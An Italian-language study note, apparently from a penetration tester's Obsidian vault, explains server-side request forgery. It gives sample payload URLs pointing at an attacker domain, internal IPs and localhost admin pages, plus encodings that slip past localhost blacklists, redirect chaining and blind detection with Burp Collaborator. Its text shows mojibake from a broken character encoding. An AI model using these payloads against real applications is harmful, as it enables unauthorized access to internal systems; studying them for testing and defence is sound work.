#Exploit_noti 

---
---
---
#### INDICE
- [[#Introduzione]]
- [[#Dominio Controllato]]
- [[#Attacco su Sistemi Interni]]
- [[#Bypass delle blacklist]]
- [[#Doppio reindirizzamento]]
- [[#Blind SSRF]]
---
---
---
### Introduzione
La vulnerabilitÃ  *SSRF (Server-Side Request Forgery)* si verifica quando un'applicazione web consente a un utente malintenzionato di far eseguire dal server richieste HTTP verso destinazioni arbitrarie, spesso interne o protette. Questo comportamento puÃ² essere sfruttato per accedere a servizi interni, esfiltrare dati, eseguire codice o aggirare controlli di accesso.

> [!ATTENTION]  
> **Dove cercare:** ogni parametro che accetta URL, host o percorsi remoti (es. `url=`, `endpoint=`, `api=`, `path=`).  
> **Cosa cercare:** possibilitÃ  di interazione con `localhost`, `127.0.0.1`, IP privati (es. `192.168.*`, `10.*`), metadata AWS, ecc.

---
### Dominio Controllato
Lâ€™attaccante invia un parametro con URL arbitrario. Il server, fidandosi, effettua la richiesta.

```
http://site.com/admin?param=http://attacker_site.com
```

Il server accede a `/admin` pensando sia trusted, bypassando eventuali ACL o autenticazione.

ðŸ“šâ€‹ Writeups:
- *Linux:*[[Linux#Ready| Ready]],
- *Windows:*[[Windows#Love| Love]],

---
### Attacco su Sistemi Interni
Spesso il target non Ã¨ il server stesso, ma un sistema **back-end non esposto**, come un pannello admin o una risorsa cloud interna:

```
http://site.com?param=http://192.168.0.68/admin
```

Se l'app server ha accesso alla rete interna, il payload puÃ² colpire anche sistemi invisibili dallâ€™esterno. Ãˆ possibile automatizzare il processo tramite[[ðŸ”¡ Glossario#Burp Suite| BurpÂ°]].

ðŸ“šâ€‹ Writeups:
- *Linux:*[[Linux#Editorial| Editorial]],

---
### Bypass delle blacklist
I filtri anti-SSRF spesso bloccano `127.0.0.1` o `localhost`, ma Ã¨ possibile riscrivere lo stesso indirizzi in diversi formati:
- IP in formato decimale: `2130706433`
- IP ottale: `017700000001`
- `localhost` registrato come DNS (`evil.localhost.burpcollaborator.net`)
- URL encoded: `%31%32%37%2E%30%2E%30%2E%31`

---
### Doppio reindirizzamento
Redirect esterni che puntano a target interni:

```
http://site.com?param=http://trusted.com/redirect?url=http://127.0.0.1/admin
```

---
### Blind SSRF
Quando la risposta della richiesta non Ã¨ visibile nel frontend, si parla di **Blind SSRF**. In questi casi Ã¨ fondamentale usare strumenti come **Burp Collaborator** ([guida](https://portswigger.net/burp/documentation/desktop/tools/collaborator/getting-started)), che mostrano se il server ha effettuato la richiesta.

```
http://site.com?param=http://<subdomain>.burpcollaborator.net
```